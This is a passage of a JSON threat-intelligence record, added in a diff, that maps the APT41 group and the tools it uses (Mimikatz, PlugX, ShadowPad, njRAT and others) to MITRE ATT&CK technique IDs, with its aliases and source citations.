+          "name": "Endpoint Denial of Service"
+        },
+        {
+          "id": "T1480",
+          "name": "Execution Guardrails"
+        },
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel"
+        },
+        {
+          "id": "T1646",
+          "name": "Exfiltration Over C2 Channel"
+        },
+        {
+          "id": "T1658",
+          "name": "Exploitation for Client Execution"
+        },
+        {
+          "id": "T1404",
+          "name": "Exploitation for Privilege Escalation"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1544",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1430",
+          "name": "Location Tracking"
+        },
+        {
+          "id": "T1655",
+          "name": "Masquerading"
+        },
+        {
+          "id": "T1575",
+          "name": "Native API"
+        },
+        {
+          "id": "T1046",
+          "name": "Network Service Discovery"
+        },
+        {
+          "id": "T1423",
+          "name": "Network Service Scanning"
+        },
+        {
+          "id": "T1509",
+          "name": "Non-Standard Port"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "013",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Encrypted/Encoded File"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "001",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Binary Padding"
+        },
+        {
+          "id": "T1406",
+          "name": "Obfuscated Files or Information"
+        },
+        {
+          "id": "T1660",
+          "name": "Phishing"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "id": "T1424",
+          "name": "Process Discovery"
+        },
+        {
+          "id": "T1631",
+          "name": "Process Injection"
+        },
+        {
+          "parent_id": "T1636",
+          "id": "003",
+          "name": "Protected User Data",
+          "sub_name": "Contact List"
+        },
+        {
+          "parent_id": "T1636",
+          "id": "002",
+          "name": "Protected User Data",
+          "sub_name": "Call Log"
+        },
+        {
+          "parent_id": "T1636",
+          "id": "004",
+          "name": "Protected User Data",
+          "sub_name": "SMS Messages"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "id": "T1513",
+          "name": "Screen Capture"
+        },
+        {
+          "id": "T1129",
+          "name": "Shared Modules"
+        },
+        {
+          "id": "T1582",
+          "name": "SMS Control"
+        },
+        {
+          "id": "T1518",
+          "name": "Software Discovery"
+        },
+        {
+          "id": "T1418",
+          "name": "Software Discovery"
+        },
+        {
+          "id": "T1409",
+          "name": "Stored Application Data"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1426",
+          "name": "System Information Discovery"
+        },
+        {
+          "parent_id": "T1422",
+          "id": "002",
+          "name": "System Network Configuration Discovery",
+          "sub_name": "Wi-Fi Discovery"
+        },
+        {
+          "id": "T1422",
+          "name": "System Network Configuration Discovery"
+        },
+        {
+          "id": "T1421",
+          "name": "System Network Connections Discovery"
+        },
+        {
+          "id": "T1512",
+          "name": "Video Capture"
+        }
+      ]
+    },
+    {
+      "id": "S0443",
+      "name": "MESSAGETAP",
+      "descr": "(Citation: FireEye MESSAGETAP October 2019)(Citation: Crowdstrike GTR2020 Mar 2020)",
+      "techniques": [
+        {
+          "parent_id": "T1560",
+          "id": "003",
+          "name": "Archive Collected Data",
+          "sub_name": "Archive via Custom Method"
+        },
+        {
+          "id": "T1119",
+          "name": "Automated Collection"
+        },
+        {
+          "parent_id": "T1074",
+          "id": "001",
+          "name": "Data Staged",
+          "sub_name": "Local Data Staging"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "004",
+          "name": "Indicator Removal",
+          "sub_name": "File Deletion"
+        },
+        {
+          "id": "T1040",
+          "name": "Network Sniffing"
+        },
+        {
+          "id": "T1049",
+          "name": "System Network Connections Discovery"
+        }
+      ]
+    },
+    {
+      "id": "S0002",
+      "name": "Mimikatz",
+      "descr": "(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)",
+      "techniques": [
+        {
+          "parent_id": "T1134",
+          "id": "005",
+          "name": "Access Token Manipulation",
+          "sub_name": "SID-History Injection"
+        },
+        {
+          "id": "T1098",
+          "name": "Account Manipulation"
+        },
+        {
+          "parent_id": "T1547",
+          "id": "005",
+          "name": "Boot or Logon Autostart Execution",
+          "sub_name": "Security Support Provider"
+        },
+        {
+          "id": "T1555",
+          "name": "Credentials from Password Stores"
+        },
+        {
+          "parent_id": "T1555",
+          "id": "003",
+          "name": "Credentials from Password Stores",
+          "sub_name": "Credentials from Web Browsers"
+        },
+        {
+          "parent_id": "T1555",
+          "id": "004",
+          "name": "Credentials from Password Stores",
+          "sub_name": "Windows Credential Manager"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "006",
+          "name": "OS Credential Dumping",
+          "sub_name": "DCSync"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "002",
+          "name": "OS Credential Dumping",
+          "sub_name": "Security Account Manager"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "001",
+          "name": "OS Credential Dumping",
+          "sub_name": "LSASS Memory"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "004",
+          "name": "OS Credential Dumping",
+          "sub_name": "LSA Secrets"
+        },
+        {
+          "id": "T1207",
+          "name": "Rogue Domain Controller"
+        },
+        {
+          "id": "T1649",
+          "name": "Steal or Forge Authentication Certificates"
+        },
+        {
+          "parent_id": "T1558",
+          "id": "001",
+          "name": "Steal or Forge Kerberos Tickets",
+          "sub_name": "Golden Ticket"
+        },
+        {
+          "parent_id": "T1558",
+          "id": "002",
+          "name": "Steal or Forge Kerberos Tickets",
+          "sub_name": "Silver Ticket"
+        },
+        {
+          "parent_id": "T1552",
+          "id": "004",
+          "name": "Unsecured Credentials",
+          "sub_name": "Private Keys"
+        },
+        {
+          "parent_id": "T1550",
+          "id": "002",
+          "name": "Use Alternate Authentication Material",
+          "sub_name": "Pass the Hash"
+        },
+        {
+          "parent_id": "T1550",
+          "id": "003",
+          "name": "Use Alternate Authentication Material",
+          "sub_name": "Pass the Ticket"
+        }
+      ]
+    },
+    {
+      "id": "S0039",
+      "name": "Net",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1087",
+          "id": "002",
+          "name": "Account Discovery",
+          "sub_name": "Domain Account"
+        },
+        {
+          "parent_id": "T1087",
+          "id": "001",
+          "name": "Account Discovery",
+          "sub_name": "Local Account"
+        },
+        {
+          "parent_id": "T1098",
+          "id": "007",
+          "name": "Account Manipulation",
+          "sub_name": "Additional Local or Domain Groups"
+        },
+        {
+          "parent_id": "T1136",
+          "id": "001",
+          "name": "Create Account",
+          "sub_name": "Local Account"
+        },
+        {
+          "parent_id": "T1136",
+          "id": "002",
+          "name": "Create Account",
+          "sub_name": "Domain Account"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "005",
+          "name": "Indicator Removal",
+          "sub_name": "Network Share Connection Removal"
+        },
+        {
+          "id": "T1135",
+          "name": "Network Share Discovery"
+        },
+        {
+          "id": "T1201",
+          "name": "Password Policy Discovery"
+        },
+        {
+          "parent_id": "T1069",
+          "id": "002",
+          "name": "Permission Groups Discovery",
+          "sub_name": "Domain Groups"
+        },
+        {
+          "parent_id": "T1069",
+          "id": "001",
+          "name": "Permission Groups Discovery",
+          "sub_name": "Local Groups"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "002",
+          "name": "Remote Services",
+          "sub_name": "SMB/Windows Admin Shares"
+        },
+        {
+          "id": "T1018",
+          "name": "Remote System Discovery"
+        },
+        {
+          "id": "T1049",
+          "name": "System Network Connections Discovery"
+        },
+        {
+          "id": "T1007",
+          "name": "System Service Discovery"
+        },
+        {
+          "parent_id": "T1569",
+          "id": "002",
+          "name": "System Services",
+          "sub_name": "Service Execution"
+        },
+        {
+          "id": "T1124",
+          "name": "System Time Discovery"
+        }
+      ]
+    },
+    {
+      "id": "S0104",
+      "name": "netstat",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "id": "T1049",
+          "name": "System Network Connections Discovery"
+        }
+      ]
+    },
+    {
+      "id": "S0385",
+      "name": "njRAT",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "id": "T1010",
+          "name": "Application Window Discovery"
+        },
+        {
+          "parent_id": "T1547",
+          "id": "001",
+          "name": "Boot or Logon Autostart Execution",
+          "sub_name": "Registry Run Keys / Startup Folder"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "001",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "PowerShell"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "parent_id": "T1555",
+          "id": "003",
+          "name": "Credentials from Password Stores",
+          "sub_name": "Credentials from Web Browsers"
+        },
+        {
+          "parent_id": "T1132",
+          "id": "001",
+          "name": "Data Encoding",
+          "sub_name": "Standard Encoding"
+        },
+        {
+          "id": "T1005",
+          "name": "Data from Local System"
+        },
+        {
+          "parent_id": "T1568",
+          "id": "001",
+          "name": "Dynamic Resolution",
+          "sub_name": "Fast Flux DNS"
+        },
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "parent_id": "T1562",
+          "id": "004",
+          "name": "Impair Defenses",
+          "sub_name": "Disable or Modify System Firewall"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "004",
+          "name": "Indicator Removal",
+          "sub_name": "File Deletion"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "009",
+          "name": "Indicator Removal",
+          "sub_name": "Clear Persistence"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "001",
+          "name": "Input Capture",
+          "sub_name": "Keylogging"
+        },
+        {
+          "id": "T1112",
+          "name": "Modify Registry"
+        },
+        {
+          "id": "T1106",
+          "name": "Native API"
+        },
+        {
+          "id": "T1571",
+          "name": "Non-Standard Port"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "013",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Encrypted/Encoded File"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "004",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Compile After Delivery"
+        },
+        {
+          "id": "T1120",
+          "name": "Peripheral Device Discovery"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "id": "T1012",
+          "name": "Query Registry"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "001",
+          "name": "Remote Services",
+          "sub_name": "Remote Desktop Protocol"
+        },
+        {
+          "id": "T1018",
+          "name": "Remote System Discovery"
+        },
+        {
+          "id": "T1091",
+          "name": "Replication Through Removable Media"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1033",
+          "name": "System Owner/User Discovery"
+        },
+        {
+          "id": "T1125",
+          "name": "Video Capture"
+        }
+      ]
+    },
+    {
+      "id": "S0097",
+      "name": "Ping",
+      "descr": "(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)",
+      "techniques": [
+        {
+          "id": "T1018",
+          "name": "Remote System Discovery"
+        }
+      ]
+    },
+    {
+      "id": "S0013",
+      "name": "PlugX",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used a variant of [PlugX](https://attack.mitre.org/software/S0013) to connect to Windows and Linux systems via SSH and Samba/CIFS.(Citation: apt41_mandiant)(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "004",
+          "name": "Application Layer Protocol",
+          "sub_name": "DNS"
+        },
+        {
+          "parent_id": "T1547",
+          "id": "001",
+          "name": "Boot or Logon Autostart Execution",
+          "sub_name": "Registry Run Keys / Startup Folder"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "parent_id": "T1543",
+          "id": "003",
+          "name": "Create or Modify System Process",
+          "sub_name": "Windows Service"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "parent_id": "T1573",
+          "id": "001",
+          "name": "Encrypted Channel",
+          "sub_name": "Symmetric Cryptography"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "parent_id": "T1564",
+          "id": "001",
+          "name": "Hide Artifacts",
+          "sub_name": "Hidden Files and Directories"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "001",
+          "name": "Hijack Execution Flow",
+          "sub_name": "DLL"
+        },
+        {
+          "parent_id": "T1562",
+          "id": "004",
+          "name": "Impair Defenses",
+          "sub_name": "Disable or Modify System Firewall"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "001",
+          "name": "Input Capture",
+          "sub_name": "Keylogging"
+        },
+        {
+          "parent_id": "T1036",
+          "id": "004",
+          "name": "Masquerading",
+          "sub_name": "Masquerade Task or Service"
+        },
+        {
+          "parent_id": "T1036",
+          "id": "005",
+          "name": "Masquerading",
+          "sub_name": "Match Legitimate Resource Name or Location"
+        },
+        {
+          "id": "T1112",
+          "name": "Modify Registry"
+        },
+        {
+          "id": "T1106",
+          "name": "Native API"
+        },
+        {
+          "id": "T1135",
+          "name": "Network Share Discovery"
+        },
+        {
+          "id": "T1095",
+          "name": "Non-Application Layer Protocol"
+        },
+        {
+          "id": "T1571",
+          "name": "Non-Standard Port"
+        },
+        {
+          "id": "T1027",
+          "name": "Obfuscated Files or Information"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "id": "T1012",
+          "name": "Query Registry"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "id": "T1049",
+          "name": "System Network Connections Discovery"
+        },
+        {
+          "parent_id": "T1127",
+          "id": "001",
+          "name": "Trusted Developer Utilities Proxy Execution",
+          "sub_name": "MSBuild"
+        },
+        {
+          "parent_id": "T1497",
+          "id": "001",
+          "name": "Virtualization/Sandbox Evasion",
+          "sub_name": "System Checks"
+        },
+        {
+          "parent_id": "T1102",
+          "id": "001",
+          "name": "Web Service",
+          "sub_name": "Dead Drop Resolver"
+        }
+      ]
+    },
+    {
+      "id": "S0194",
+      "name": "PowerSploit",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "id": "T1134",
+          "name": "Access Token Manipulation"
+        },
+        {
+          "parent_id": "T1087",
+          "id": "001",
+          "name": "Account Discovery",
+          "sub_name": "Local Account"
+        },
+        {
+          "id": "T1123",
+          "name": "Audio Capture"
+        },
+        {
+          "parent_id": "T1547",
+          "id": "001",
+          "name": "Boot or Logon Autostart Execution",
+          "sub_name": "Registry Run Keys / Startup Folder"
+        },
+        {
+          "parent_id": "T1547",
+          "id": "005",
+          "name": "Boot or Logon Autostart Execution",
+          "sub_name": "Security Support Provider"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "001",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "PowerShell"
+        },
+        {
+          "parent_id": "T1543",
+          "id": "003",
+          "name": "Create or Modify System Process",
+          "sub_name": "Windows Service"
+        },
+        {
+          "parent_id": "T1555",
+          "id": "004",
+          "name": "Credentials from Password Stores",
+          "sub_name": "Windows Credential Manager"
+        },
+        {
+          "id": "T1005",
+          "name": "Data from Local System"
+        },
+        {
+          "id": "T1482",
+          "name": "Domain Trust Discovery"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "007",
+          "name": "Hijack Execution Flow",
+          "sub_name": "Path Interception by PATH Environment Variable"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "009",
+          "name": "Hijack Execution Flow",
+          "sub_name": "Path Interception by Unquoted Path"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "001",
+          "name": "Hijack Execution Flow",
+          "sub_name": "DLL"
+        },
+        {
+          "parent_id": "T1574",
+          "id": "008",
+          "name": "Hijack Execution Flow",
+          "sub_name": "Path Interception by Search Order Hijacking"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "001",
+          "name": "Input Capture",
+          "sub_name": "Keylogging"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "005",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Indicator Removal from Tools"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "010",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Command Obfuscation"
+        },
+        {
+          "parent_id": "T1003",
+          "id": "001",
+          "name": "OS Credential Dumping",
+          "sub_name": "LSASS Memory"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "parent_id": "T1055",
+          "id": "001",
+          "name": "Process Injection",
+          "sub_name": "Dynamic-link Library Injection"
+        },
+        {
+          "id": "T1012",
+          "name": "Query Registry"
+        },
+        {
+          "id": "T1620",
+          "name": "Reflective Code Loading"
+        },
+        {
+          "parent_id": "T1053",
+          "id": "005",
+          "name": "Scheduled Task/Job",
+          "sub_name": "Scheduled Task"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "parent_id": "T1558",
+          "id": "003",
+          "name": "Steal or Forge Kerberos Tickets",
+          "sub_name": "Kerberoasting"
+        },
+        {
+          "parent_id": "T1552",
+          "id": "002",
+          "name": "Unsecured Credentials",
+          "sub_name": "Credentials in Registry"
+        },
+        {
+          "parent_id": "T1552",
+          "id": "006",
+          "name": "Unsecured Credentials",
+          "sub_name": "Group Policy Preferences"
+        },
+        {
+          "id": "T1047",
+          "name": "Windows Management Instrumentation"
+        }
+      ]
+    },
+    {
+      "id": "S0006",
+      "name": "pwdump",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1003",
+          "id": "002",
+          "name": "OS Credential Dumping",
+          "sub_name": "Security Account Manager"
+        }
+      ]
+    },
+    {
+      "id": "S0112",
+      "name": "ROCKBOOT",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1542",
+          "id": "003",
+          "name": "Pre-OS Boot",
+          "sub_name": "Bootkit"
+        }
+      ]
+    },
+    {
+      "id": "S0596",
+      "name": "ShadowPad",
+      "descr": "(Citation: FireEye APT41 Aug 2019)(Citation: Recorded Future RedEcho Feb 2021)",
+      "techniques": [
+        {
+          "parent_id": "T1071",
+          "id": "004",
+          "name": "Application Layer Protocol",
+          "sub_name": "DNS"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "002",
+          "name": "Application Layer Protocol",
+          "sub_name": "File Transfer Protocols"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "parent_id": "T1132",
+          "id": "002",
+          "name": "Data Encoding",
+          "sub_name": "Non-Standard Encoding"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "parent_id": "T1568",
+          "id": "002",
+          "name": "Dynamic Resolution",
+          "sub_name": "Domain Generation Algorithms"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1112",
+          "name": "Modify Registry"
+        },
+        {
+          "id": "T1095",
+          "name": "Non-Application Layer Protocol"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "011",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Fileless Storage"
+        },
+        {
+          "id": "T1027",
+          "name": "Obfuscated Files or Information"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "id": "T1055",
+          "name": "Process Injection"
+        },
+        {
+          "parent_id": "T1055",
+          "id": "001",
+          "name": "Process Injection",
+          "sub_name": "Dynamic-link Library Injection"
+        },
+        {
+          "id": "T1029",
+          "name": "Scheduled Transfer"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1016",
+          "name": "System Network Configuration Discovery"
+        },
+        {
+          "id": "T1033",
+          "name": "System Owner/User Discovery"
+        },
+        {
+          "id": "T1124",
+          "name": "System Time Discovery"
+        }
+      ]
+    },
+    {
+      "id": "S0225",
+      "name": "sqlmap",
+      "descr": "(Citation: Rostovcev APT41 2021)",
+      "techniques": [
+        {
+          "id": "T1190",
+          "name": "Exploit Public-Facing Application"
+        }
+      ]
+    },
+    {
+      "id": "S0430",
+      "name": "Winnti for Linux",
+      "descr": "(Citation: Crowdstrike GTR2020 Mar 2020)",
+      "techniques": [
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files or Information"
+        },
+        {
+          "parent_id": "T1573",
+          "id": "001",
+          "name": "Encrypted Channel",
+          "sub_name": "Symmetric Cryptography"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1095",
+          "name": "Non-Application Layer Protocol"
+        },
+        {
+          "parent_id": "T1027",
+          "id": "013",
+          "name": "Obfuscated Files or Information",
+          "sub_name": "Encrypted/Encoded File"
+        },
+        {
+          "id": "T1014",
+          "name": "Rootkit"
+        },
+        {
+          "id": "T1205",
+          "name": "Traffic Signaling"
+        }
+      ]
+    },
+    {
+      "id": "S0412",
+      "name": "ZxShell",
+      "descr": "(Citation: FireEye APT41 Aug 2019)",
+      "techniques": [
+        {
+          "parent_id": "T1134",
+          "id": "002",
+          "name": "Access Token Manipulation",
+          "sub_name": "Create Process with Token"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "001",
+          "name": "Application Layer Protocol",
+          "sub_name": "Web Protocols"
+        },
+        {
+          "parent_id": "T1071",
+          "id": "002",
+          "name": "Application Layer Protocol",
+          "sub_name": "File Transfer Protocols"
+        },
+        {
+          "parent_id": "T1059",
+          "id": "003",
+          "name": "Command and Scripting Interpreter",
+          "sub_name": "Windows Command Shell"
+        },
+        {
+          "parent_id": "T1136",
+          "id": "001",
+          "name": "Create Account",
+          "sub_name": "Local Account"
+        },
+        {
+          "parent_id": "T1543",
+          "id": "003",
+          "name": "Create or Modify System Process",
+          "sub_name": "Windows Service"
+        },
+        {
+          "id": "T1005",
+          "name": "Data from Local System"
+        },
+        {
+          "id": "T1499",
+          "name": "Endpoint Denial of Service"
+        },
+        {
+          "id": "T1190",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "id": "T1083",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "parent_id": "T1562",
+          "id": "004",
+          "name": "Impair Defenses",
+          "sub_name": "Disable or Modify System Firewall"
+        },
+        {
+          "parent_id": "T1562",
+          "id": "001",
+          "name": "Impair Defenses",
+          "sub_name": "Disable or Modify Tools"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "001",
+          "name": "Indicator Removal",
+          "sub_name": "Clear Windows Event Logs"
+        },
+        {
+          "parent_id": "T1070",
+          "id": "004",
+          "name": "Indicator Removal",
+          "sub_name": "File Deletion"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "004",
+          "name": "Input Capture",
+          "sub_name": "Credential API Hooking"
+        },
+        {
+          "parent_id": "T1056",
+          "id": "001",
+          "name": "Input Capture",
+          "sub_name": "Keylogging"
+        },
+        {
+          "id": "T1112",
+          "name": "Modify Registry"
+        },
+        {
+          "id": "T1106",
+          "name": "Native API"
+        },
+        {
+          "id": "T1046",
+          "name": "Network Service Discovery"
+        },
+        {
+          "id": "T1571",
+          "name": "Non-Standard Port"
+        },
+        {
+          "id": "T1057",
+          "name": "Process Discovery"
+        },
+        {
+          "parent_id": "T1055",
+          "id": "001",
+          "name": "Process Injection",
+          "sub_name": "Dynamic-link Library Injection"
+        },
+        {
+          "id": "T1090",
+          "name": "Proxy"
+        },
+        {
+          "id": "T1012",
+          "name": "Query Registry"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "005",
+          "name": "Remote Services",
+          "sub_name": "VNC"
+        },
+        {
+          "parent_id": "T1021",
+          "id": "001",
+          "name": "Remote Services",
+          "sub_name": "Remote Desktop Protocol"
+        },
+        {
+          "id": "T1113",
+          "name": "Screen Capture"
+        },
+        {
+          "parent_id": "T1218",
+          "id": "011",
+          "name": "System Binary Proxy Execution",
+          "sub_name": "Rundll32"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1033",
+          "name": "System Owner/User Discovery"
+        },
+        {
+          "id": "T1007",
+          "name": "System Service Discovery"
+        },
+        {
+          "parent_id": "T1569",
+          "id": "002",
+          "name": "System Services",
+          "sub_name": "Service Execution"
+        },
+        {
+          "id": "T1125",
+          "name": "Video Capture"
+        }
+      ]
+    }
+  ],
+  "add_software_ref": true,
+  "alias_descriptions": [
+    {
+      "name": "Wicked Panda",
+      "descr": "(Citation: Crowdstrike GTR2020 Mar 2020)"
+    },
+    {
+      "name": "Brass Typhoon",
+      "descr": "(Citation: Microsoft Threat Actor Naming July 2023)"
+    },
+    {
+      "name": "BARIUM",
+      "descr": "(Citation: Microsoft Threat Actor Naming July 2023)"
+    }
+  ],
+  "citations": {
+    "current_number": 0,
+    "Crowdstrike GTR2020 Mar 2020": {
+      "description": "Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020.",
+      "number": null,
+      "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+    },
+    "FireEye APT41 2019": {
+      "description": "FireEye. (2019). Double DragonAPT41, a dual espionage andcyber crime operationAPT41. Retrieved September 23, 2019.",
+      "number": null,
+      "url": "https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf"
+    },
+    "FireEye APT41 Aug 2019": {
+      "description": "Fraser, N., et al. (2019, August 7). Double DragonAPT41, a dual espionage and cyber crime operation APT41. Retrieved September 23, 2019.",
+      "number": null,
+      "url": "https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf"
+    },
+    "apt41_mandiant": {
+      "description": "Mandiant. (n.d.). APT41, A DUAL ESPIONAGE AND CYBER CRIME OPERATION. Retrieved June 11, 2024.",
+      "number": null,
+      "url": "https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf"
+    },
+    "Microsoft Threat Actor Naming July 2023": {
+      "description": "Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023.",
+      "number": null,
+      "url": "https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide"
+    },
+    "Group IB APT 41 June 2021": {
+      "description": "Rostovcev, N. (2021, June 10). Big airline heist APT41 likely behind a third-party attack on Air India. Retrieved August 26, 2021.",
+      "number": null,
+      "url": "https://www.group-ib.com/blog/colunmtk-apt41/"
+    },
+    "Rostovcev APT41 2021": {
+      "description": "Nikita Rostovcev. (2022, August 18). APT41 World Tour 2021 on a tight schedule. Retrieved February 22, 2024.",
+      "number": null,
+      "url": "https://www.group-ib.com/blog/apt41-world-tour-2021/"
+    },
+    "FireEye APT41 March 2020": {
+      "description": "Glyer, C, et al. (2020, March). This Is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits. Retrieved April 28, 2020.",
+      "number": null,
+      "url": "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+    },
+    "apt41_dcsocytec_dec2022": {
+      "description": "DCSO CyTec Blog. (2022, December 24). APT41 — The spy who failed to encrypt me. Retrieved June 13, 2024.",
+      "number": null,
+      "url": "https://medium.com/@DCSO_CyTec/apt41-the-spy-who-failed-to-encrypt-me-24fc0f49cad1"
+    },
+    "Twitter ItsReallyNick APT41 EK": {
+      "description": "Carr, N. (2019, October 30). Nick Carr Status Update APT41 Environmental Keying. Retrieved September 12, 2024.",
+      "number": null,
+      "url": "https://x.com/ItsReallyNick/status/1189622925286084609"
+    },
+    "Google Cloud APT41 2024": {
+      "description": "Mike Stokkel et al. (2024, July 18). APT41 Has Arisen From the DUST. Retrieved September 16, 2024.",
+      "number": null,
+      "url": "https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust"
+    },
+    "Mandiant APT41": {
+      "description": "Rufus Brown, Van Ta, Douglas Bienstock, Geoff Ackerman, John Wolfram. (2022, March 8). Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments. Retrieved July 8, 2022.",
+      "number": null,
+      "url": "https://www.mandiant.com/resources/apt41-us-state-governments"
+    },
+    "MelikovBlackBerry LightSpy 2024": {
+      "description": "Melikov, D. (2024, April 11). LightSpy Returns: Renewed Espionage Campaign Targets Southern Asia, Possibly India. Retrieved January 14, 2025.",
+      "number": null,
+      "url": "https://blogs.blackberry.com/en/2024/04/lightspy-returns-renewed-espionage-campaign-targets-southern-asia-possibly-india"
+    },
+    "Google Cloud APT41 2022": {
